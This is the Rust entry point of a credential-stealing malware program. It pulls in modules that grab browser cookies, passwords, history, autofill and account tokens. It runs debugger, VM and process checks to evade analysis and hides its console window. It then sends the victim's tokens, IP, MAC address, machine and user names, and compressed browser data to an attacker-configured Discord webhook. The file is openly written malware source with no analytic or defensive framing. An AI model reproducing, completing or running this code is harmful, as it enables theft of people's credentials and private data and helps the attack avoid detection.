#![allow(unused_imports)]
#![allow(dead_code)]
#![allow(unreachable_code)]

use std::sync::Arc;
use regex::Regex;
use regex::bytes::RegexBuilder;
use std::sync::Mutex;
use rayon::iter::IntoParallelRefIterator;
use rayon::iter::ParallelIterator;
use deflate::deflate_bytes;
use obfstr::obfstr as obf;

mod grabber {
    pub mod utils;
    pub mod grabber;
}

mod browser {
    pub mod utils;
    pub mod browser;
    pub mod cookies;
    pub mod history;
    pub mod password;
    pub mod bookmarks;
    pub mod autofill;
}

mod evasion {
    pub mod process;
    pub mod network;
    pub mod system;
    pub mod vm;
    pub mod cpu;
}

mod global {
    pub mod utils;
    pub mod loader;
}

#[tokio::main]
async fn main() {
    if global::utils::WEBHOOK_URL.to_string() == obf!("WEBHOOK_HERE") {
        println!("Fill WEBHOOK in ./src/global/utils.rs:29");
        return;
    }

    let new_credentials = Arc::new(Mutex::<global::utils::Credentials>::new(Default::default()));
    
    let functions: Vec<Box<dyn Fn(&Arc<Mutex<global::utils::Credentials>>) -> bool + Send + Sync>> = vec![
        Box::new(|creds| evasion::system::get(creds)),
        Box::new(|creds| evasion::network::get(creds)),
        Box::new(|creds| evasion::process::get_kill_process(creds)),
        Box::new(|_| evasion::process::output_debug_string()),
        Box::new(|_| evasion::process::is_debugger_present()),
        Box::new(|_| evasion::vm::is_vm_present()),
        Box::new(|_| evasion::cpu::inside_vm()),
    ];

    // Run all functions by iterating over them
    if let Some(_) = functions.par_iter().find_any(|f| f(&new_credentials)) {
        // Can bypass some Av that bypass exit function
        global::utils::force_kill();
    }
    global::utils::hide_console_window();
    // global::utils::create_persistence();
    global::utils::kill_protector();

    let credentials_clone = Arc::clone(&new_credentials);

    rayon::spawn(move || {
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            let browsers = browser::browser::grab_browser().await;
            let mut final_creds = credentials_clone.lock().unwrap();
            final_creds.browsers = browsers;
        });
    });

    let regex_pattern = RegexBuilder::new(&grabber::utils::REGEX)
        .dfa_size_limit(100 * (1 << 20))
        .build()
        .unwrap();
    let encrypted_regex_pattern = RegexBuilder::new(grabber::utils::ENCRYPTED_REGEX.as_str())
        .unicode(false)
        .dfa_size_limit(100 * (1 << 20))
        .build()
        .unwrap();
    let mut tasks = Vec::new();

    grabber::grabber::token_grabber(Arc::clone(&new_credentials), regex_pattern.clone(), encrypted_regex_pattern.clone(), &mut tasks).await;
    grabber::grabber::process_data(Arc::clone(&new_credentials)).await;

    let final_creds_clone = {
        let final_creds_guard = new_credentials.lock().unwrap();
        crate::global::utils::Credentials {
            id: global::utils::remove_duplicates(final_creds_guard.id.clone()),
            token: final_creds_guard.token.clone(),
            ip: final_creds_guard.ip.clone(),
            mac: final_creds_guard.mac.clone(),
            pc_name: final_creds_guard.pc_name.clone(),
            pc_user: final_creds_guard.pc_user.clone(),
            proc_list: final_creds_guard.proc_list.clone(),
            uuids: final_creds_guard.uuids.clone(),
            browsers: final_creds_guard.browsers.clone(),
        }
    };
    rayon::spawn(move || {
        let _ = global::utils::send_data(&global::utils::WEBHOOK_URL, &format!("{:?}NOP{:?}NOP{:?},{:?},{:?},{:?}", final_creds_clone.token, final_creds_clone.id, final_creds_clone.ip, final_creds_clone.mac, final_creds_clone.pc_name, final_creds_clone.pc_user));
    });

    global::utils::send_file_to_discord_webhook(&deflate_bytes(serde_json::to_string_pretty(&final_creds_clone.browsers).unwrap().as_bytes()), "deflated_data.txt", &global::utils::WEBHOOK_URL).unwrap();
    return;
}
